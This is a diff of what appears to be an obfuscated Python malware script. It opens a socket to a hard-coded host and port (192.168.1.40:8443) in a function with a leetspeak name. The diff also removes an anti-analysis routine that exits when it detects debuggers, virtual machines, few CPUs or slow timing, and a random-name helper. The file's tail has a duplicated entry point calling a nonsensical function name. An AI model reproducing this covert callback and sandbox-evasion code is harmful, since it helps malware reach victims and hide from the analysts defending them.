@@ -7,12 +7,6 @@
 
 
 
-
-
-
-
-
-
 import psutil
 import sys
 
@@ -54,9 +48,6 @@ k41DKdLRahoz/5E=
 R4nd0m_H0stn4m3 = "192.168.1.40"
 R4nd0m_P0rt = 8443
 
-def G3nR4nd0mN0m():
-    return ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=10))
-
 def C4nn3x4v3c5eR():
     try:
         with socket.create_connection((R4nd0m_H0stn4m3, R4nd0m_P0rt)) as sock:
@@ -75,30 +66,7 @@ def C4nn3x4v3c5eR():
     except Exception as e:
         pass
 
-def V3r1f13Nv1r0nn3m3nt():
-    T00ls_D3b00g = ["dbg", "trace", "gdb", "ldd"]
-    for tool in T00ls_D3b00g:
-        if tool in os.environ.get("PATH", "").lower():
-            sys.exit(1)
-
-    M1ch1n3_Virt = ["\\VirtualMachines", "\\Hyper-V"]
-    for path in M1ch1n3_Virt:
-        if os.path.exists(path):
-            sys.exit(1)
-
-    if os.cpu_count() < 2:
-        sys.exit(1)
-
-    start = time.time()
-    for _ in range(10**6):
-        pass
-    elapsed = time.time() - start
-    if elapsed > 2:
-        sys.exit(1)
-
 def main():
-    random.seed(time.time())
-    V3r1f13Nv1r0nn3m3nt()
     C4nn3x4v3c5eR()
 
 if __name__ == "__main__":
@@ -117,4 +85,3 @@ if __name__ == "__main__":
 if __name__ == "__main__":
     lddzdzdzh_dzdzdgegegerge_pggeegege()
     sys.exit(0)
-
